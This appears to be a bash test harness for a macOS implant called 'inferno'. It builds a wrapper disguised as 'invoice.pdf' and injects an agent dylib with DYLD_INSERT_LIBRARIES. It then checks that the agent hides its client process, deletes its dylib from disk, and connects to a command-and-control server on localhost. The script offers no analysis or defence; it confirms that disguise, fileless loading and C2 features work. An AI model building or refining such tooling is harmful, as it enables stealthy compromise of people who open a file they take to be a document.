#!/bin/bash
set -e

SERVER_IP="127.0.0.1"
SERVER_PORT=4242
BUILD_DIR="$(pwd)/build"

echo "=== Phase 4A — Manual Verification ==="
echo ""

# 0. Cleanup
pkill -9 -f inferno_client 2>/dev/null || true
pkill -9 -f inferno_shim   2>/dev/null || true
pkill -9 -f inferno_server 2>/dev/null || true
rm -f /tmp/.inferno_agent.dylib /tmp/invoice_wrapper

# 1. Build
echo "--- Step 0: Build ---"
cmake --build build --target inferno_wrapper --target inferno_agent_dylib --target inferno_shim 2>&1 | tail -2
# Copy binaries to /tmp to avoid colon-in-path issues on macOS
cp "$BUILD_DIR/wrapper/invoice.pdf" /tmp/invoice_wrapper
cp "$BUILD_DIR/libinferno_agent.dylib" /tmp/libinferno_agent.dylib
cp "$BUILD_DIR/inferno_shim" /tmp/inferno_shim
echo ""

# 2. Unit tests
echo "--- Stage 1: Unit Tests ---"
"$BUILD_DIR/inferno_tests" 2>&1 | grep -E "injector|PASS|FAIL"
echo ""

# 3. Stage 2: shim loads dylib directly (from /tmp to avoid colon in path)
echo "--- Stage 2: Shim + Dylib Direct Load ---"
INFERNO_SERVER_IP=$SERVER_IP INFERNO_SERVER_PORT=$SERVER_PORT \
DYLD_INSERT_LIBRARIES=/tmp/libinferno_agent.dylib \
/tmp/inferno_shim &
SHIM_PID=$!
sleep 2

if kill -0 $SHIM_PID 2>/dev/null; then
    echo "[PASS] inferno_shim is running (PID $SHIM_PID)"
else
    echo "[FAIL] inferno_shim exited unexpectedly"
    exit 1
fi

if ps aux | grep -q "[i]nferno_client"; then
    echo "[FAIL] inferno_client process found"
    exit 1
fi
echo "[PASS] No inferno_client process"
kill $SHIM_PID 2>/dev/null || true
wait $SHIM_PID 2>/dev/null || true
echo ""

# 4. Stage 3: Full wrapper injection with C2 server
echo "--- Stage 3: Wrapper Injection + C2 Connection ---"
"$BUILD_DIR/inferno_server" > /tmp/srv.log 2>&1 &
SERVER_PID=$!
sleep 2

if kill -0 $SERVER_PID 2>/dev/null; then
    echo "[PASS] inferno_server is running (PID $SERVER_PID)"
else
    echo "[FAIL] inferno_server failed to start"
    exit 1
fi

/tmp/invoice_wrapper $SERVER_IP $SERVER_PORT > /tmp/wrp.log 2>&1 &
sleep 6

echo "=== Process check ==="
ps aux | grep -E "inferno" | grep -v grep || echo "(none)"

if ps aux | grep -q "[i]nferno_shim"; then
    echo "[PASS] inferno_shim running after wrapper injection"
else
    echo "[FAIL] inferno_shim not found"
    exit 1
fi

if ps aux | grep -q "[i]nferno_client"; then
    echo "[FAIL] inferno_client process found"
    exit 1
fi
echo "[PASS] No inferno_client process"

if [ -f /tmp/.inferno_agent.dylib ]; then
    echo "[FAIL] dylib still on disk"
    exit 1
fi
echo "[PASS] Dylib deleted from disk"

if grep -q "Agent connected" /tmp/srv.log 2>/dev/null; then
    echo "[PASS] Agent connected to C2 server"
    grep "Agent connected" /tmp/srv.log
else
    echo "[FAIL] Agent did not connect to server"
    exit 1
fi

echo ""
echo "=== Phase 4A: ALL VERIFICATIONS PASSED ==="

# Cleanup
kill $SERVER_PID 2>/dev/null || true
pkill -9 -f inferno_shim 2>/dev/null || true
